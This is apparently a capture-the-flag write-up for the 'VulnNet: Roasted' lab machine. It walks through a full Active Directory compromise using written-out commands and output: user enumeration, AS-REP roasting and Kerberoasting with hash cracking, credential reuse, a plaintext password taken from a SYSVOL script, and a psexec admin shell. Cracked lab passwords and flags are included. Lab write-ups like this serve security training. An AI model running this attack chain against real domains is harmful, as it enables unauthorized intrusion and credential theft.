
 VulnNet: Roasted
==================

# Nmap
```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-15 08:06:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 53s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-15T08:06:21
|_  start_date: N/A

```

## USER FLAG
```
smbmap -H vulnnet.thm -u anonymous


Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote Admin
C$                                                      NO ACCESS       Default share
IPC$                                                    READ ONLY       Remote IPC
NETLOGON                                                NO ACCESS       Logon server share 
SYSVOL                                                  NO ACCESS       Logon server share 
VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing

```



IPC$  is readble, readable IPC$ means user enumeration


```
lookupsid.py anonymous@vulnnet.thm


498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

Take "SidTypeUser" separatly those are available users



```
cat users.txt


Administrator
Guest
kbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
``` 
The we use Impacker ASREPRoast get users hashes

```
GetNPUsers.py 'VULNNET-RST/' -usersfile user.txt -no-pass -dc-ip vulnnet.thm


[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST:059a61f063ab90a19de3b23e1625cba5$96a15722de2e556de5c01ca3e09cb4a329ec24f9aaf37f206b2a40dd34e701603d2ff11fc733ada501bd4280d3717196d5b6d40639c4a39121e96d640cd2c1686a46b385586f6e63079e6dce3d74f80b985cd1126a8ce8962aeab74a9c3a5c4ff519d1e305b15e41271258ecf95c4bd71232a9238a5efcab3b5e67bfc5db197d907727d68960c7caef739e737fc81ee3d779d9f0f603a16a365398f37d6fbcf5910c09500d114289c39f6179cad1885359d41ed0cc94d0c98127c136d9ac06a2eab33ff2f48d6a6939f0612e86f3e64e164cd066812dcc8684f41160ec95ea274795121460e50e1f062ebf9a31d1183c
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set

```

Now we habe kerbros hash for user 't-skid' crack that hash and get password


```
john --wordlist=/opt/rockyou.txt pass.txt


tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST)
```

With this Kerbros password we can try to get other hashes from different users, we try all the users only this give output "enterprise-core-vn"


```
GetUserSPNs.py 'VULNNET-RST/t-skid:tj072889*' -outputfile hashes.kerberoast -dc-ip vulnnet.thm


ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-12 01:15:09.913979

```

Hash saved in file now we need to crack that using John also


```
john --wordlist=/opt/rockyou.txt hashes.kerberoast


ry=ibfkfv,s6h,   (?)
```

Now login using evil-winrm


```
evil-winrm -i vulnnet.thm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'


*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cat ..\Desktop\user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
```

Now we have one user and password using this we can enumerate SMB again it will lead to root.

## ROOT FLAG
```
smbmap -H vulnnet.thm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'


Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote Admin
C$                                                      NO ACCESS       Default share
IPC$                                                    READ ONLY       Remote IPC
NETLOGON                                                READ ONLY       Logon server share 
SYSVOL                                                  READ ONLY       Logon server share 
VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing

```

SYSVOL is readable we can login into SMB using creds and look for files


```
smbclient //vulnnet.thm/SYSVOL --user=enterprise-core-vn%ry=ibfkfv,s6h,


smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs
```

We can check for any saved password and we will find it 

```
cat ResetPassword.vbs


[...]
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
[...]

```

We found creds using that enumerate SMB again 

```
smbmap -H vulnnet.thm -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'


 Disk                                                    Permissions     Comment
 ----                                                    -----------     -------
 ADMIN$                                                  READ, WRITE     Remote Admin
 C$                                                      READ, WRITE     Default share
 IPC$                                                    READ ONLY       Remote IPC
 NETLOGON                                                READ, WRITE     Logon server share 
 SYSVOL                                                  READ, WRITE     Logon server share 
 VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
 VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```


We have write access to SMB as Administrator, so we can spawn shell using psexec



```
psexec.py a-whitehat:bNdKVkjv3RR9ht@vulnnet.thm


C:\Windows\system32>type C:\Users\Administrator\Desktop\system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
```

